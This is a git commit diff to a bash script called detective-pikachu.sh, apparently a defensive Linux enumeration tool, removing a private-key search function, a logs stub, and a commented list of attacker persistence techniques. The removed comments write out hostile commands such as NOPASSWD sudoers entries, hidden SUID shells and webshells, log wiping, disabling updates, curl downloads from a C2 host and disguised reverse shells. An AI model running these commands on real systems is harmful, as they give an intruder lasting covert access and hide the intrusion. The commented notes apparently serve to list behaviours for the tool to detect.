d19316bb55ce3d49ab13ee2d2f1ed9137fce0627
K7-Avenger <48218837+K7-Avenger@users.noreply.github.com>
2023-02-13 11:51:56 -0600

    Update detective-pikachu.sh

--- detective-pikachu.sh
+++ detective-pikachu.sh
@@ -154,35 +154,6 @@ enumFiles(){
 
 }
 
-enumKeys(){
-  echo "***********************************"
-  echo "** Hidden keys and access tokens **"
-  echo "***********************************"
-  cryptoKey=$(find / -exec grep -rl -e "-----BEGIN PRIVATE KEY-----" {} \; 2> /dev/null)
-  rsaPK=$(find / -exec grep -rl -e "-----BEGIN RSA PRIVATE KEY-----" {} \; 2> /dev/null)
-  openSshPK=$(find / -exec grep -rl -e "-----BEGIN OPENSSH PRIVATE KEY-----" {} \; 2> /dev/null)
-  pgpPK=$(find / -exec grep -rl -e "-----BEGIN PGP PRIVATE KEY BLOCK-----" {} \; 2> /dev/null)
-  sshdsaPK=$(find / -exec grep -rl -e "-----BEGIN DSA PRIVATE KEY-----" {} \; 2> /dev/null)
-  sshecPK=$(find / -exec grep -rl -e "-----BEGIN EC PRIVATE KEY-----" {} \; 2> /dev/null)
-
-  keyCheck="$cryptoKey\n$rsaPK\n$openSshPK\n$pgpPK\n$sshdsaPK\n$sshecPK"
-  keyCheck=$(echo -e -n "$keyCheck" | sort -u)
-
-  if(test -z "$keyCheck"); then
-    echo -e -n "${GREEN}No private keys not found\n"
-  else
-    echo -e -n "${RED}** Regex match(s), possible keys found: **\n${YELLOW}$keyCheck\n"
-  fi
-  echo -e "${RESET}"
-
-}
-
-enumLogs(){
-  echo "*****************************"
-  echo "** Suspicious log activity **"
-  echo "*****************************"
-}
-
 enumConfigs(){
   echo "***************************"
   echo "** System Configurations **"
@@ -234,67 +205,6 @@ enumTeamRocket(){
     echo -e -n "${RED}SSH Keys located, possible finding in \n${YELLOW}$redKeys\n"
   fi
   echo -e "${RESET}"
-
-  # Permitting root ssh login >> send to hardening script
-    # sed -i 's/^PermitRootLogin .$/PermitRootLogin yes/' /etc/ssh/sshd_config
-
-  # Use of chattr (chatter -i) to make dirs/files sticky >> send to logging
-    # chatter -i /root/.ssh/authroized_keys*
-    # chatter -i "/etc/ssh/sshd_config"
-
-  # modifying user permissions >> send to logging
-    # usermod -s /bin/sh bin
-
-  # /etc/sudoers - gloabal sudoers 'ALL ALL=(ALL:ALL) NOPASSWD:ALL'
-  
-
-  # web-backdoors "usermod -G admin -a bin" same for www-data, httpd & apache
-  # Apparently, Ubuntu automatically gives users of the 'admin' group sudo rights.
-    # usermod -G admin -a bin
-
-  # hidden copies of '/bin/bash'
-    # /dev/... ; chmod +s /dev/.../pwnd
-
-  #hidden backdoor webshells
-    #/var/www/.src.php ; /var/www/html/.src.php
-
-  #disabling updates
-    #echo 'exclude=*' >> /etc/yum.conf
-    #echo -e "Pachage: *\nPin: release *\nPin-Priority: -1" > /etc/apt/preferences.d/ubuntu
-    #echo -e "Pachage: *\nPin: release *\nPin-Priority: -1" > /etc/apt/preferences
-    #sed -ie 's/\"metapackages\"/\"metapackages\";\n\t\"kernel\*\"/'g /etc/apt/apt.conf.d/01autoremove
-
-  #stopping critical services
-    #service httpd stop; postfix; sendmail; mysql; webmin; named; bind; 
-    #killall -9 webmin.pl; apache2; httpd; named; mysqld_safe; mysql; qemu-kvm
-
-  #granting executable permissions
-    #chmod +x /usr/share/services.sh  
-
-  #granting SUID permsions on /bin/
-
-  # deleting logs
-    # cat /dev/null > /var/log/wtmp
-    # cat /dev/null > /var/log/btmp
-  
-  # Grabbing files from C2
-    #curl http://$C2_IP/$1 -s --create-dirs -o "/etc/udev/conf.d/
-
-  # Webservers/reverse shells disquised as kernel process [kworker]
-    #setsid ./$binname -i eth0 -s 1 -b 5555 $C2_IP -d -x
-  # use of nc
-
-  # deletion or moving of binaries (chattr & kill)
-    # mv $(which chattr) /usr/bin/diff2
-
-  # give every user a cronjob
-    # for user in $(awk -f: '$3 > 500 {print $1}' /etc/passwd); do
-
-  # allow every user to run bash as root
-    # for user in $(awk -f: '$3 > 500 {print $1}' /etc/passwd); do
-      #echo "'/etc/udev/conf.d/    /default' $C2_IP $C2_PORT >> $home/.bashrc 
-      # >> /dev/.bashrc ; /etc/profile ; /etc/bash.bashrc
-
 }
 
 enumCronServices(){
@@ -357,30 +267,21 @@ while getopts 'ufckrsl :' OPTION; do
 		c)
 			enumConfigs
 			;;
-		k)
-			enumKeys
-			;;
 		r)
 			enumTeamRocket
 			;;
 		s)
 			enumCronServices
 			;;
-		l)
-			enumLogs
-			;;
-
 		?)
 			echo -e -n "${YELLOW}"
 			echo -e "Correct usage:\t $(basename $0) -flag(s)"
 			echo -e "-u\t Enumerates users & groups"
 			echo -e "-f\t Enumerates for suspicous or potentially exploitable files"
 			echo -e "-c\t Identifies system configs that may be unsafe"
-			echo -e "-k\t Searches the filesystem for access (SSH) keys"
 			echo -e "-s\t Enumerates cronjobs & running services"
-			echo -e "-l\t Searches logfiles for suspicious activity"
       			echo -e -n "${GREEN}"
-     	 		echo -e "If you are not sure, just ask detective-pikachu to '-surf' "
+     	 		echo -e "If you are not sure, just ask detective-pikachu to '-surf'."
 			echo -e "${RESET}"
 			exit 1
 			;;
